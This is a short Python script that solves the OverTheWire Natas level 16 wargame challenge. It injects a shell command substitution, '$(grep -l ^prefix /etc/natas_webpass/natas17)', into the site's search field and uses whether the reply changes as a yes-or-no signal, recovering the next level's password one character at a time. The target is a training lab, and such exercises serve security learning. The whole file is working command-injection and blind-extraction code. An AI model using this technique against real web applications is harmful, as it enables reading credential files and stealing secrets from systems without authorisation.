import string

from natas.lib import natas_session

session, url = natas_session(16)

POSSIBLE_CHARS = string.ascii_letters + string.digits


def got_results(password_prefix: str) -> bool:
    payload = f"secured$(grep -l ^{password_prefix} /etc/natas_webpass/natas17)"
    response = session.post(url, data={"needle": payload, "submit": "submit"})
    return "secured" not in response.text

import time
start_time = time.perf_counter()

password = ""
while True:
    found_next_char = False

    for ch in POSSIBLE_CHARS:
        if got_results(password + ch):
            password += ch
            found_next_char = True
            break

    if not found_next_char:
        break

end_time = time.perf_counter()
print(f"Time taken: {end_time - start_time} seconds")
print(password)
